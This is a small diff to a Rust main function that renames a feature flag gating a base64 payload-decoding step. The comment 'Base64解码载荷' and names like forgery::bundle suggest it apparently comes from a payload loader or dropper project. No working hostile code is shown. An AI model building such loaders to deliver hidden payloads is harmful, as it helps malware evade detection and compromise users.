@@ -32,7 +32,7 @@ fn main() {
     forgery::bundle::bundlefile();
 
     // Base64解码载荷
-    #[cfg(feature = "decrypt")]
+    #[cfg(feature = "base64_decode")]
     let decrypted_data = match base64_decode_payload() {
             Some(d) => d,
             None => process::exit(0),
